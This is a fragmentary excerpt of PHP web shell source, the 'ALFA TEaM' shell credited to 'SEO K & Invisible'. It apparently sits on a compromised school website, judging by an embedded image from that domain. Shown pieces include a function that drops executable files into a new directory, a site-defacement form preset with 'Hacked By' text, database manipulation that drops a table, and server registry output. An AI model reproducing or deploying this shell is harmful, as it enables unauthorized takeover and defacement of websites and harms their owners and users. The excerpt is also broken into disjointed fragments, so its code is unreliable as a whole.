...
.ml1{ border:1px solid #ab10c9;padding:5px;margin:0;overflow: auto; }
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="" src="https://kelas.daqu.sch.id/theme/classic/templates/core/temletsold.png" /></td>
</tr>
<tr>
...
<font color='#00A220'>Shell Coded By SEO K & Invisible (ALFA TEaM)</font><br>
...
function alfaWriteTocgiapi($name, $source){
	@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
	@mkdir('SEO-K-GANTENG',0755);
	__write_file("SEO-K-GANTENG/".$name, __get_resource($source));
	@chmod("SEO-K-GANTENG/".$name, 0755);
}
...
<textarea name=index rows='19' cols='103'><title>Hacked By SEO K & Invisible</title><b>Hacked By SEO K & Invisible</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
...
<title>Hacked By SEO K & Invisible</title><b>Hacked By SEO K & Invisible</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
if ($sole == 1){
$solevis = @mysqli_fetch_assoc($solevisible);$res= $solevis['ID'];
}
...
while($i=$this->fetch())
$r[] = $i['file'];
$this->query('droptable solevisible');return array('file'=>implode("\n",$r));
break;}
return false;
}
...
echo("<center><table border='1'>");
echo("<tr><td><b><font color=\"#4b0ba3\">Register</font></td><td>$registrar</td></tr></b>");
echo("<tr><td><b><font color=\"#4b0ba3\">Setting</font></td><td>$setting</td></tr></b>");
echo("<tr><td><b><font color=\"#4b0ba3\">Value</font></td><td>$value</td></tr></b>");
echo "</table><br><br></center>";
}
}
